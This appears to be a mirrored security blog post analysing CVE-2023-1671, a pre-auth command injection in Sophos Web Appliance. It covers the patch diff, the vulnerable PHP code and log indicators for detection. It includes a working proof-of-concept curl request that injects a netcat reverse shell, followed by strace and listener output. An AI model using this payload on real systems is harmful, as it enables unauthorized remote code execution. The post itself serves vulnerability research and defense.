---
title: "Analysis of Pre-Auth RCE in Sophos Web Appliance CVE-2023-1671 - Blog - VulnCheck"
date: 2023-04-21T00:00:00.000Z
draft: false
type: posts
categories: 
- 
---
# Analysis of Pre-Auth RCE in Sophos Web Appliance CVE-2023-1671 - Blog - VulnCheck

<br/>

<br/>
On April 4, 2023, Sophos published a security advisory\[^1\] for their Web Appliance product. The advisory includes information on \[CVE-2023-1671\](https://nvd.nist.gov/vuln/detail/CVE-2023-1671), a critical vulnerability in versions prior to \[4.3.10.4\](https://wsa.sophos.com/docs/ws1000/ws1000/concepts/ReleaseNotes\_4.3.10.4.html):\\n\\n> A pre-auth command injection vulnerability in the warn-proceed handler allowing execution of arbitrary code was discovered and responsibly disclosed to Sophos by an external security researcher via the Sophos bug bounty program.\\n\\nGiven the \[initial access\](https://vulncheck.com/product/initial-access-intelligence) nature of the vulnerability, VulnCheck decided to investigate.\\n\\n# BLUF: Mass Exploitation Unlikely\\n\\nThe notes in the advisory detail the caveats quite well:\\n\\n> \* End of Life date for Sophos Web Appliance is on July 20, 2023\\n> \* Sophos recommends that Sophos Web Appliance is protected by a firewall and not accessible via the public Internet\\n> \* There is no action required for Sophos Web Appliance customers, as updates are installed automatically by default\\n\\nConsequently, exploitation at scale is highly unlikely.\\n\\n# Analyzing the Patch\\n\\n\`/opt/ws/bin/ftsblistpack\` is a Perl script that shells out to \`/opt/ws/bin/sblistpack\`, which is another Perl script. The patch changes the \[\`system\`\](https://perldoc.perl.org/functions/system) function's invocation such that the shell is no longer invoked:\\n\\n\`\`\`diff\\n--- unpatched/opt/ws/bin/ftsblistpack 2022-04-08 20:38:49.000000000 -0500\\n+++ patched/opt/ws/bin/ftsblistpack 2023-03-24 17:08:26.000000000 -0500\\n@@ -25,7 +25,7 @@\\n open my $flag, ">", "$flag\_file\_dir/$proceeded\_flag\_file" or die "Open file \[$flag\_file\_dir/$proceeded\_flag\_file\] failed" and $rc++;\\n close($flag);\\n\\n- $rc += system("$sblistpack '$uri' '$user' '$filetype' '$filein' '$fileout'");\\n+ $rc += system($sblistpack, $uri, $user, $filetype, $filein, $fileout);\\n }\\n\\n exit $rc;\\n\`\`\`\\n\\nNote the single-quoted arguments to the shell command in the unpatched code. This will be important later. Tracing from sink to source, we can see that \`/opt/ui/apache/htdocs/controllers/UsrBlocked.php\` shells out to \`ftsblistpack\` with user-supplied parameters:\\n\\n\`\`\`php\\n if($\_GET\['action'\] == 'continue') {\\n\\n if(strlen(trim($\_POST\['user'\])) > 0)\\n $user = base64\_decode($\_POST\['user\_encoded'\]);\\n else\\n $user = $\_POST\['client-ip'\];\\n if($user == '-') $user = $\_POST\['client-ip'\];\\n $user = escapeshellarg($user);\\n//snip\\n // use sblistpack to allow access\\n if($\_POST\['args\_reason'\] == 'filetypewarn') {\\n $key = $\_POST\['url'\];\\n $packer = '/opt/ws/bin/ftsblistpack';\\n $value = $\_POST\['filetype'\];\\n }\\n else {\\n $key = $\_POST\['domain'\];\\n $packer = '/opt/ws/bin/sblistpack';\\n $catParts = explode("|",$\_POST\['raw\_category\_id'\]);\\n $value = $catParts\[0\];\\n }\\n\\n $key = escapeshellarg($key);\\n $value = escapeshellarg($value);\\n $this->log->write("DEBUG","cmd = '$packer $key $user $value'");\\n $result = shell\_exec("$packer $key $user $value 2>&1");\\n\`\`\`\\n\\nNote that user-controlled input is still processed through PHP's \[\`escapeshellarg\`\](https://www.php.net/manual/en/function.escapeshellarg.php) function, which will escape \_and add\_ single quotes to a shell argument. You may be able to see where this is going.\\n\\n# Developing an RCE PoC\\n\\nExploitation is relatively straightforward. \`UsrBlocked.php\` is routed through \`/index.php?c=blocked\`, and the required \`GET\` and \`POST\` parameters are supplied thereafter. Since the \`user\_encoded\` parameter is Base64-encoded, it's perfect for our command injection. No escaping or other encoding is necessary! The full \`curl\` command to RCE is demonstrated below:\\n\\n::shell-prompt\\n\`\`\`\\nwvu@kharak:~$ curl -k --trace-ascii % "https://192.168.56.108/index.php?c=blocked&action=continue" -d "args\_reason=filetypewarn&url=$RANDOM&filetype=$RANDOM&user=$RANDOM&user\_encoded=$(echo -n "';nc -e /bin/sh 192.168.56.1 4444 #" | base64)"\\n#snip\\n=> Send header, 184 bytes (0xb8)\\n0000: POST /index.php?c=blocked&action=continue HTTP/1.1\\n0034: Host: 192.168.56.108\\n004a: User-Agent: curl/7.88.1\\n0063: Accept: \*/\*\\n0070: Content-Length: 120\\n0085: Content-Type: application/x-www-form-urlencoded\\n00b6:\\n=> Send data, 120 bytes (0x78)\\n0000: args\_reason=filetypewarn&url=16625&filetype=5831&user=4525&user\_\\n0040: encoded=JztuYyAtZSAvYmluL3NoIDE5Mi4xNjguNTYuMSA0NDQ0ICM=\\n\`\`\`\\n::\\n\\nHow \_exactly\_ the command injection works is perhaps best illustrated by the following \`strace\` output:\\n\\n\`\`\`c\\n\[pid 22283\] execve("/bin/sh", \["sh", "-c", "/opt/ws/bin/ftsblistpack '16625' ''\\\\'';nc -e /bin/sh 192.168.56.1 4444 #' '5831' 2>&1"\], \[/\* 16 vars \*/\]) = 0\\n\[pid 22284\] execve("/opt/ws/bin/ftsblistpack", \["/opt/ws/bin/ftsblistpack", "16625", "';nc -e /bin/sh 192.168.56.1 4444 #", "5831"\], \[/\* 16 vars \*/\]) = 0\\n\[pid 22285\] execve("/bin/sh", \["sh", "-c", "/opt/ws/bin/sblistpack '16625' '';nc -e /bin/sh 192.168.56.1 4444 #' '5831' '/persist/wsa/ftsblist.in' '/persist/wsa/ftsblist.kvlist'"\], \[/\* 16 vars \*/\]) = 0\\n\[pid 22288\] execve("/opt/ws/bin/sblistpack", \["/opt/ws/bin/sblistpack", "16625", ""\], \[/\* 16 vars \*/\]) = 0\\n\[pid 22285\] --- SIGCHLD (Child exited) @ 0 (0) ---\\n\[pid 22299\] execve("/bin/nc", \["nc", "-e", "/bin/sh", "192.168.56.1", "4444"\], \[/\* 16 vars \*/\]) = 0\\n\[pid 22299\] execve("/bin/sh", \["sh"\], \[/\* 16 vars \*/\]) = 0\\n\`\`\`\\n\\nWhen \`';nc -e /bin/sh 192.168.56.1 4444 #\` is injected into \`ftsblistpack\`, the input is wrapped in single quotes, resulting in the "sanitized" input \`'';nc -e /bin/sh 192.168.56.1 4444 #'\`, which will close the opening quote, execute a \`netcat\` reverse shell, and comment out the rest of the command line. If you had a listener set up, you'd catch the shell:\\n\\n::shell-prompt\\n\`\`\`\\nwvu@kharak:~$ rlwrap -rS '$ ' -nH /dev/null ncat -lkv 4444\\nNcat: Version 7.93 ( https://nmap.org/ncat )\\nNcat: Listening on :::4444\\nNcat: Listening on 0.0.0.0:4444\\n$ Ncat: Connection from 192.168.56.108.\\nNcat: Connection from 192.168.56.108:56426.\\n$ id\\nuid=1000(spiderman) gid=1000(spiderman) groups=1000(spiderman),16(cron),44(tproxyd),45(wdx)\\n$ uname -a\\nLinux foo 3.2.89 #1 SMP Tue Mar 29 00:03:09 UTC 2022 i686 GNU/Linux\\n$\\n\`\`\`\\n::\\n\\n\_Insert Spider-Man Pointing meme.\_\\n\\n# Hunting for IOCs\\n\\nA single line is appended to the \`/log/ui\_access\_log\` file once the HTTP request returns a response:\\n\\n\`\`\`\\n192.168.56.1 - - \[19/Apr/2023:19:46:21 +0000\] "POST /index.php?c=blocked&action=continue HTTP/1.1" 302 - "-" "curl/7.88.1"\\n\`\`\`\\n\\nIt isn't much, but it's something to look for when hunting for exploitation. Note that writing the log entry may block on command execution. Additionally, the previous \`strace\` output can be used for process detections.\\n\\n# References\\n\\n\[^1\]: https://www.sophos.com/en-us/security-advisories/sophos-sa-20230404-swa-rce\\n

#### [Source](https://vulncheck.com/blog/cve-2023-1671-analysis)

<br/>
---
